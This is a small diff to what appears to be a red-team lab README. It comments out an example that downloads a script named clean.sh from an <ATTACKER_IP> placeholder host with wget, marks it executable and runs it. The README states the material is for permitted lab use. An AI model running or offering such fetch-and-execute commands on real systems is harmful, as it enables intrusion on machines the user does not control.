@@ -26,9 +26,7 @@ This script is for educational and red team lab use only.
 Do not use on production environments or without permission.
 
 💡 Example Use
-bash
-Copy
-Edit
-wget http://<ATTACKER_IP>:8080/clean.sh -O /tmp/clean.sh
-chmod +x /tmp/clean.sh
-bash /tmp/clean.sh
+
+#wget http://<ATTACKER_IP>:8080/clean.sh -O /tmp/clean.sh
+#chmod +x /tmp/clean.sh
+#bash /tmp/clean.sh
